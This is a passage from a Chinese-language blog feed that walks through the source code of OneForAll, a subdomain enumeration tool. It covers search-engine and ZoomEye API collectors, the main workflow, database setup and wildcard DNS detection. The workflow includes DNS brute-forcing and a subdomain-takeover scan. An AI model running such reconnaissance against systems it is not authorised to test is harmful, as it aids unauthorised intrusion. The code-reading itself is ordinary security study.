class="hljs-string"></span><br><span class="hljs-string">        :param str domain: 域名</span><br><span class="hljs-string">        :param str filtered_subdomain: 过滤的子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        self.page_num = <span class="hljs-number">0</span>  <span class="hljs-comment"># 二次搜索重新置0</span><br>        resp = self.get(self.init)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            <span class="hljs-keyword">return</span><br>        self.cookie = resp.cookies  <span class="hljs-comment"># 获取cookie</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            time.sleep(self.delay)<br>            self.proxy = self.get_proxy(self.source)<br>            query = <span class="hljs-string">&#x27;site:.&#x27;</span> + domain + filtered_subdomain<br>            params = &#123;<span class="hljs-string">&#x27;text&#x27;</span>: query, <span class="hljs-string">&#x27;p&#x27;</span>: self.page_num,<br>                      <span class="hljs-string">&#x27;numdoc&#x27;</span>: self.per_page_num&#125;<br>            resp = self.get(self.addr, params)<br>            subdomains = self.match_subdomains(resp, fuzzy=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.check_subdomains(subdomains):<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&gt;next&lt;/a&gt;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:  <span class="hljs-comment"># 搜索页面没有出现下一页时停止搜索</span><br>                <span class="hljs-keyword">break</span><br>            self.page_num += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> self.page_num &gt;= self.limit_num:  <span class="hljs-comment"># 搜索条数限制</span><br>                <span class="hljs-keyword">break</span><br><br></code></pre></div></td></tr></table></figure><h2 id="6-15-zoomeye-api"><a href="#6-15-zoomeye-api" class="headerlink" title="6.15 zoomeye_api"></a>6.15 zoomeye_api</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ZoomEyeAPI</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;ZoomEyeAPISearch&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://api.zoomeye.org/web/search&#x27;</span><br>        self.delay = <span class="hljs-number">2</span><br>        self.user = settings.zoomeye_api_usermail<br>        self.pwd = settings.zoomeye_api_password<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        登陆获取查询taken</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        url = <span class="hljs-string">&#x27;https://api.zoomeye.org/user/login&#x27;</span><br>        data = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: self.user, <span class="hljs-string">&#x27;password&#x27;</span>: self.pwd&#125;<br>        resp = self.post(url=url, json=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module login failed&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>        data = resp.json()<br>        <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span>:<br>            logger.log(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module login success&#x27;</span>)<br>            <span class="hljs-keyword">return</span> data.get(<span class="hljs-string">&#x27;access_token&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, data.get(<span class="hljs-string">&#x27;message&#x27;</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        page_num = <span class="hljs-number">1</span><br>        access_token = self.login()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> access_token:<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            time.sleep(self.delay)<br>            self.header = self.get_header()<br>            self.proxy = self.get_proxy(self.source)<br>            self.header.update(&#123;<span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">&#x27;JWT &#x27;</span> + access_token&#125;)<br>            params = &#123;<span class="hljs-string">&#x27;query&#x27;</span>: <span class="hljs-string">&#x27;hostname:&#x27;</span> + self.domain, <span class="hljs-string">&#x27;page&#x27;</span>: page_num&#125;<br>            resp = self.get(self.addr, params)<br>            subdomains = self.match_subdomains(resp)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subdomains:  <span class="hljs-comment"># 搜索没有发现子域名则停止搜索</span><br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            page_num += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> page_num &gt; <span class="hljs-number">500</span>:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">403</span>:<br>                <span class="hljs-keyword">break</span><br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信安 工具分析 OneForAll</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>工具分析</tag>
      
      <tag>OneForAll</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OneForAll代码分析-2</title>
    <link href="/2021/09/11/%E4%BF%A1%E5%AE%89/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/OneForAll/OneForAll%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2/"/>
    <url>/2021/09/11/%E4%BF%A1%E5%AE%89/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/OneForAll/OneForAll%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2/</url>
    
    <content type="html"><![CDATA[<h1 id="OneForAll代码分析-2"><a href="#OneForAll代码分析-2" class="headerlink" title="OneForAll代码分析-2"></a>OneForAll代码分析-2</h1><p>承接上文，对于oneforall.py文件分析了其他的函数部分还有main函数没有进行分析，此处分析main函数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    OneForAll main process</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :return: subdomain results</span><br><span class="hljs-string">    :rtype: list</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 对数据库进行建立</span><br>    utils.init_table(self.domain)<br>    <br>    <span class="hljs-comment"># 如果网络无法连接，不使用子域集合模块</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.access_internet:<br>        logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">&#x27;Because it cannot access the Internet, &#x27;</span><br>                            <span class="hljs-string">&#x27;OneForAll will not execute the subdomain collection module!&#x27;</span>)<br>    <span class="hljs-comment"># 网络可以连接 </span><br>    <span class="hljs-keyword">if</span> self.access_internet:<br>        <span class="hljs-comment"># 最后返回的是bool类型，表示是否是wildcard类型 (泛域名，即不管访问sss.***.com还是sfsdfsdf.***.com都会解析到同一个IP地址:即前缀无效。。。)</span><br>        self.enable_wildcard = wildcard.detect_wildcard(self.domain)<br>        <span class="hljs-comment"># 调用子域模块进行收集</span><br>        collect = Collect(self.domain)<br>        collect.run()<br><br>    <br>    <span class="hljs-comment"># 跟进函数 利用常见的SRV进行收集</span><br>    srv = BruteSRV(self.domain)<br>    srv.run()<br><br>    <span class="hljs-comment"># 判断是否设置爆破默认设置为True</span><br>    <span class="hljs-keyword">if</span> self.brute:<br>        <span class="hljs-comment"># Due to there will be a large number of dns resolution requests,</span><br>        <span class="hljs-comment"># may cause other network tasks to be error</span><br>        <span class="hljs-comment"># 由于将有大量dns解析请求,可能导致其他网络任务出错</span><br>        <br>        <span class="hljs-comment"># 跟进函数 </span><br>        brute = Brute(self.domain, word=<span class="hljs-literal">True</span>, export=<span class="hljs-literal">False</span>)<br>        brute.enable_wildcard = self.enable_wildcard<br>        brute.in_china = self.in_china<br>        brute.quite = <span class="hljs-literal">True</span><br>        brute.run()<br>        <br>    <span class="hljs-comment"># 删除对应的数据</span><br>    utils.deal_data(self.domain)<br>    <span class="hljs-comment"># Export results without resolve</span><br>    <span class="hljs-comment"># 导出结果而不解析 </span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.dns:<br>        self.data = self.export_data()<br>        self.datas.extend(self.data)<br>        <span class="hljs-keyword">return</span> self.data<br><br>    <span class="hljs-comment"># 获得数据库中的数据为dict格式返回</span><br>    self.data = utils.get_data(self.domain)<br><br>    <span class="hljs-comment"># Resolve subdomains</span><br>    <span class="hljs-comment"># 解析子域</span><br>    <span class="hljs-comment"># 清除数据库中对应的表</span><br>    utils.clear_data(self.domain)<br>    <span class="hljs-comment"># </span><br>    self.data = resolve.run_resolve(self.domain, self.data)<br>    <span class="hljs-comment"># Save resolve results</span><br>    <span class="hljs-comment"># 保存解析结果</span><br>    resolve.save_db(self.domain, self.data)<br><br>    <span class="hljs-comment"># Export results without HTTP request</span><br>    <span class="hljs-comment"># 不使用HTTP请求导出结果</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.req:<br>        self.data = self.export_data()<br>        self.datas.extend(self.data)<br>        <span class="hljs-keyword">return</span> self.data<br><br>    <span class="hljs-keyword">if</span> self.enable_wildcard:<br>        <span class="hljs-comment"># deal wildcard</span><br>        <span class="hljs-comment"># 处理泛域名</span><br>        self.data = wildcard.deal_wildcard(self.data)<br><br>    <span class="hljs-comment"># HTTP request</span><br>    utils.clear_data(self.domain)<br>    request.run_request(self.domain, self.data, self.port)<br><br>    <span class="hljs-comment"># Finder module</span><br>    <span class="hljs-comment"># 查找模块</span><br>    <span class="hljs-keyword">if</span> settings.enable_finder_module:<br>        finder = Finder()<br>        finder.run(self.domain, self.data, self.port)<br><br>    <span class="hljs-comment"># altdns module</span><br>    <span class="hljs-comment"># altdns 模块</span><br>    <span class="hljs-keyword">if</span> settings.enable_altdns_module:<br>        altdns = Altdns(self.domain)<br>        altdns.run(self.data, self.port)<br><br>    <span class="hljs-comment"># Information enrichment module</span><br>    <span class="hljs-comment"># 信息充实模块</span><br>    <span class="hljs-keyword">if</span> settings.enable_enrich_module:<br>        enrich = Enrich(self.domain)<br>        enrich.run()<br><br>    self.data = self.export_data()<br>    self.datas.extend(self.data)<br><br>    <span class="hljs-comment"># Scan subdomain takeover</span><br>    <span class="hljs-comment"># 扫描子域验收</span><br>    <span class="hljs-keyword">if</span> self.takeover:<br>        subdomains = utils.get_subdomains(self.data)<br>        takeover = Takeover(targets=subdomains)<br>        takeover.run()<br>    <span class="hljs-keyword">return</span> self.data<br></code></pre></div></td></tr></table></figure><h1 id="1-init-table函数"><a href="#1-init-table函数" class="headerlink" title="1. init_table函数"></a>1. init_table函数</h1><p> 从run函数可以得到，传入了self参数到main中，逐步分析</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 首先是init_table函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_table</span>(<span class="hljs-params">domain</span>):</span><br>    <span class="hljs-comment"># 对Database对象中的相关函数进行分析</span><br>    db = Database()<br>    db.drop_table(domain)<br>    db.create_table(domain)<br>    db.close()<br></code></pre></div></td></tr></table></figure><h2 id="1-1-Database对象"><a href="#1-1-Database对象" class="headerlink" title="1.1 Database对象"></a>1.1 Database对象</h2><p>此处摘取在init_table中被使用的相关内容</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Database</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-comment"># 初始化连接</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, db_path=<span class="hljs-literal">None</span></span>):</span><br>        <span class="hljs-comment"># 根据传入的路径进行连接</span><br>        self.conn = self.get_conn(db_path)<br>    <br>    <span class="hljs-comment"># 创建连接</span><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_conn</span>(<span class="hljs-params">db_path</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Get database connection</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param   db_path: Database path</span><br><span class="hljs-string">        :return: db_conn: SQLite database connection</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;Establishing database connection&#x27;</span>)<br>        <span class="hljs-comment"># 判断db_path是否是一个连接类型</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(db_path, Connection):<br>            <span class="hljs-keyword">return</span> db_path<br>        protocol = <span class="hljs-string">&#x27;sqlite:///&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> db_path:  <span class="hljs-comment"># 数据库路径为空连接默认数据库</span><br>            db_path = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;protocol&#125;</span><span class="hljs-subst">&#123;settings.result_save_dir&#125;</span>/result.sqlite3&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            db_path = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;protocol&#125;</span><span class="hljs-subst">&#123;db_path&#125;</span>&#x27;</span><br>        <span class="hljs-comment"># 不存在数据库时会新建一个数据库</span><br>        db = records.Database(db_path) <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Database对象的初始化</span><br><span class="hljs-string">    def __init__(self, db_url=None, **kwargs):</span><br><span class="hljs-string">        # If no db_url was provided, fallback to $DATABASE_URL.</span><br><span class="hljs-string">        # 确定db地址</span><br><span class="hljs-string">        self.db_url = db_url or DATABASE_URL</span><br><span class="hljs-string"></span><br><span class="hljs-string">        if not self.db_url:</span><br><span class="hljs-string">            raise ValueError(&#x27;You must provide a db_url.&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">        # Create an engine. kwargs为空。。。</span><br><span class="hljs-string">        self._engine = create_engine(self.db_url, **kwargs)</span><br><span class="hljs-string">        self.open = True</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;Use the database: <span class="hljs-subst">&#123;db_path&#125;</span>&#x27;</span>)<br>    <span class="hljs-comment"># 返回连接数据库的connection</span><br>        <span class="hljs-keyword">return</span> db.get_connection()<br>    <br>    <span class="hljs-comment"># 创建表</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_table</span>(<span class="hljs-params">self, table_name</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Create table</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param str table_name: table name</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 替换名称内容</span><br>        table_name = table_name.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>)<br>        <span class="hljs-comment"># 如果还存在该表则返回空</span><br>        <span class="hljs-keyword">if</span> self.exist_table(table_name):<br>            logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;table_name&#125;</span> table already exists&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;Creating <span class="hljs-subst">&#123;table_name&#125;</span> table&#x27;</span>)<br>        <span class="hljs-comment"># 创建表的sql语句</span><br>        self.query(<span class="hljs-string">f&#x27;create table &quot;<span class="hljs-subst">&#123;table_name&#125;</span>&quot; (&#x27;</span><br>                   <span class="hljs-string">f&#x27;id integer primary key,&#x27;</span><br>                   <span class="hljs-string">f&#x27;alive int,&#x27;</span><br>                   <span class="hljs-string">f&#x27;request int,&#x27;</span><br>                   <span class="hljs-string">f&#x27;resolve int,&#x27;</span><br>                   <span class="hljs-string">f&#x27;url text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;subdomain text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;port int,&#x27;</span><br>                   <span class="hljs-string">f&#x27;level int,&#x27;</span><br>                   <span class="hljs-string">f&#x27;cname text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;ip text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;public int,&#x27;</span><br>                   <span class="hljs-string">f&#x27;cdn int,&#x27;</span><br>                   <span class="hljs-string">f&#x27;status int,&#x27;</span><br>                   <span class="hljs-string">f&#x27;reason text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;title text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;banner text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;header text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;history text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;response text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;ip_times text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;cname_times text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;ttl text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;cidr text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;asn text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;org text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;addr text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;isp text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;resolver text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;module text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;source text,&#x27;</span><br>                   <span class="hljs-string">f&#x27;elapse float,&#x27;</span><br>                   <span class="hljs-string">f&#x27;find int)&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 删除表</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">drop_table</span>(<span class="hljs-params">self, table_name</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Delete table</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param str table_name: table name</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        table_name = table_name.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>)<br>        logger.log(<span class="hljs-string">&#x27;TRACE&#x27;</span>, <span class="hljs-string">f&#x27;Deleting <span class="hljs-subst">&#123;table_name&#125;</span> table&#x27;</span>)<br>        <span class="hljs-comment"># 删除的sql语句</span><br>        self.query(<span class="hljs-string">f&#x27;drop table if exists &quot;<span class="hljs-subst">&#123;table_name&#125;</span>&quot;&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 关闭连接</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">close</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        Close the database connection</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.conn.close()<br></code></pre></div></td></tr></table></figure><h1 id="2-wildcard和Collect"><a href="#2-wildcard和Collect" class="headerlink" title="2. wildcard和Collect"></a>2. wildcard和Collect</h1><p>在main函数中分析之后的内容</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 如果没有成功联网 OneForAll将不执行子域收集模块！ </span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.access_internet:<br>    logger.log(<span class="hljs-string">&#x27;ALERT&#x27;</span>, <span class="hljs-string">&#x27;Because it cannot access the Internet, &#x27;</span><br>                        <span class="hljs-string">&#x27;OneForAll will not execute the subdomain collection module!&#x27;</span>)<br><span class="hljs-comment"># 如果联网成功 </span><br><span class="hljs-keyword">if</span> self.access_internet:<br>    <span class="hljs-comment"># 跟进函数进行分析 最后返回的是bool类型，表示是否是wildcard类型 (泛域名，即不管访问sss.***.com还是sfsdfsdf.***.com都会解析到同一个IP地址:即前缀无效。。。)</span><br>    self.enable_wildcard = wildcard.detect_wildcard(self.domain)<br>    <span class="hljs-comment"># 跟进函数进行分析 此处调用了大量获取子域名的函数。。。</span><br>    collect = Collect(self.domain)<br>    collect.run()<br></code></pre></div></td></tr></table></figure><h2 id="2-1-wildcard"><a href="#2-1-wildcard" class="headerlink" title="2.1 wildcard"></a>2.1 wildcard</h2><p>根据之前的代码<code>self.enable_wildcard = wildcard.detect_wildcard(self.domain)</code>分析<code>detect_wildcard</code>函数</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># def detect_wildcard(domain):</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">detect_wildcard</span>(<span class="hljs-params">domain</span>):</span><br>    <span class="hljs-comment"># 跟进函数分析 </span><br>    is_enable = to_detect_wildcard(domain)<br>    <span class="hljs-keyword">if</span> is_enable:<br>        logger.log(<span 